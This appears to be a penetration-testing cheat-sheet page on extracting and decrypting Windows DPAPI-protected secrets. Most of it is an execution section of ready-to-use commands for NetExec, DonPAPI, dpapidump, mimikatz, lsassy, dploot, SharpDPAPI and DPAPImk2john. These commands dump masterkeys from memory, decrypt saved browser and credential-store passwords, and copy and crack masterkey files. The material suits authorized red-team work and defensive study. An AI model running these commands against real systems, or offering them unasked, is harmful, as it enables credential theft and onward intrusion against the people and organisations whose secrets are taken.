# DPAPI Secrets

The Data Protection API encrypts saved browser passwords, Windows Credential Manager entries, and more. With a user's masterkey — or the domain DPAPI backup key — those secrets decrypt, often revealing credentials for other systems.

## Why It Works

DPAPI derives its keys from the user's password (or, for the backup path, a domain-wide key held on the DC). Whoever holds the masterkey holds everything that user's DPAPI protected, which is usually a trove of onward credentials.

## Prerequisites

* Access to the user's DPAPI masterkey, or the domain DPAPI backup key
* The encrypted blobs from the user profile

## Execution

**Extract credentials from DPAPI**

* DPAPI
  * `nxc smb <ip_range> -u <user> -p <password> --dpapi [cookies] [nosystem]` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
  * `donpapi <domain>/<user>:<password>@<target>` [\[tool\]](https://github.com/login-securite/DonPAPI)
  * `dpapidump.py <domain>/<user>:<password>@<target>` [\[tool\]](https://github.com/fortra/impacket/pull/1898)
  * get masterkey
    * `mimikatz "sekurlsa::dpapi"` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
      * `dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>` [\[tool\]](https://github.com/zblurx/dploot)
        * **→ PassTheHash**
    * `lsassy -d <domain> -u <user> -p <password> <ip> -m rdrleakdiag -M masterkeys` [\[tool\]](https://github.com/login-securite/lsassy)
      * `dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>` [\[tool\]](https://github.com/zblurx/dploot)
        * **→ Clear text move**
  * `SharpDPAPI.exe triage` [\[tool\]](https://github.com/GhostPack/SharpDPAPI)
* Crack users masterkey
  * `copy c:\users\<user>\AppData\Roaming\Microsoft\Protect\<SID>`
    * `DPAPImk2john.py --preferred <prefered_file>` [\[tool\]](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)
      * `DPAPImk2john.py -c domain -mk <masterkey> -S <sid>` [\[tool\]](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)
        * **→ DPAPImk**

## Related

* [Credential Dumping](file:///9685693/host-access/credential-dumping.md) — the broader dumping toolkit
* [NTDS Extraction & DCSync](file:///9685693/domain-dominance/ntds-and-dcsync.md) — the domain backup key comes from the DC
